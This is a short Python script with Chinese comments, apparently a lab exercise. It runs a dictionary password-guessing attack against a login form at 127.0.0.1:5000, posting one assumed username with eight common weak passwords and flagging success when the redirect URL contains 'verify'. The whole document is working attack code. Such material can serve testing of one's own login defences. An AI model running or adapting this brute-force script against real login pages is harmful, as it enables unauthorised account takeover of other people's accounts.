import requests

# 攻击目标地址（登录页面）
URL = "http://127.0.0.1:5000/"

# 模拟用户名（假设已知）
username = "yihan "

# 模拟常见弱密码字典
password_list = [
    "123456", "admin", "password", "12345678", "qwerty", "abc123", "111111", "123123"
]

# 遍历尝试每个密码组合
for password in password_list:
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(URL, data=data)

    # 输出响应状态与提示
    print(f"Trying password: {password}")
    print(f"Response: {response.text[:100]}")  # 只显示前100字符

    # 如果出现验证码页面重定向，说明可能成功进入下一步
    if "verify" in response.url:
        print("✅ Password found and login passed to verification!")
        break